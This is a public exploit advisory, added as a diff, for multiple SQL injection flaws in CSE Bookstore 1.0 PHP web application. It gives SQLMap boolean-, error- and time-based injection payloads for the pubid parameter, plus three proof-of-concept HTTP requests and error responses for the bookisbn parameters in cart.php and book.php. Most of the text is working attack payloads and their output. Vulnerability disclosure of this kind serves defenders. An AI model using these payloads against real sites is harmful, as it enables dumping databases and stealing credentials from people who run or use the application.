@@ -1,0 +1,110 @@
+# Exploit Title : CSE Bookstore 1.0 - Multiple SQL Injection
+# Date      : 2020-12-21
+# Author    : Musyoka Ian
+# Version   : CSE Bookstore 1.0
+# Vendor Homepage: https://projectworlds.in/
+# Platform  : PHP
+# Tested on : Debian
+
+CSE Bookstore version 1.0 is vulnerable to time-based blind, boolean-based blind and OR error-based SQL injection in pubid parameter in bookPerPub.php. A successfull exploitation of this vulnerability  will lead to an attacker dumping the entire database the web appliction is running on
+
+Below is results returned by  SQLMap 
+
+Type: boolean-based blind
+Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+Payload: http://192.168.196.83:80/ebook/bookPerPub.php?pubid=' OR NOT 4138=4138#                                                                                                                                                                    Type: error-based
+Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+Payload: http://192.168.196.83:80/ebook/bookPerPub.php?pubid=' OR (SELECT 7393 FROM(SELECT COUNT(*),CONCAT(0x71717a7071,(SELECT (ELT(7393=7393,1))),0x7178716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nkDF
+
+Type: time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+Payload: http://192.168.196.83:80/ebook/bookPerPub.php?pubid=' AND (SELECT 6293 FROM (SELECT(SLEEP(5)))eqTh)-- CJmT
+
+
+POC 1 
+
+REQUEST
+========
+GET /ebook/bookPerPub.php?pubid=4' HTTP/1.1
+Host: 192.168.196.83
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=c4qd3glr3oe6earuf88sub6g1n
+Upgrade-Insecure-Requests: 1
+
+RESPONSE
+========
+
+HTTP/1.1 200 OK
+Date: Mon, 21 Dec 2020 20:09:49 GMT
+Server: Apache/2.4.38 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 172
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Can't retrieve data You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''4''' at line 1
+
+POC 2
+Also the web application is vulnerable to a SQL Injection on cart.php file by sending a sql injection payload in bookisbn post data parameter
+
+REQUEST
+=======
+
+POST /ebook/cart.php HTTP/1.1
+Host: 192.168.196.83
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://192.168.196.83/ebook/book.php?bookisbn=978-1-1180-2669-4
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+Cookie: PHPSESSID=igasmmkkf2thcc877pmjui05t9
+
+
+bookisbn=978-1-1180-2669-4'&cart=Purchase+%2f+Add+to+cart
+
+RESPONSE
+=======
+get book price failed! You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''978-1-1180-2669-4''' at line 1
+
+POC 3.
+Lastly bookisbn parameter on book.php is vunerable to SQL Injection which also has a High servierity since it could lead to dumping of database credentials
+
+REQUEST
+=======
+GET /ebook/book.php?bookisbn=978-0-7303-1484-4' HTTP/1.1
+Host: 192.168.196.83
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://192.168.196.83/ebook/books.php
+Cookie: PHPSESSID=bvmt3vp30gjnr724helh37v2on
+
+RESPONSE
+========
+HTTP/1.1 200 OK
+Date: Mon, 21 Dec 2020 20:47:58 GMT
+Server: Apache/2.4.38 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 188
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Can't retrieve data You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''978-0-7303-1484-4''' at line 1
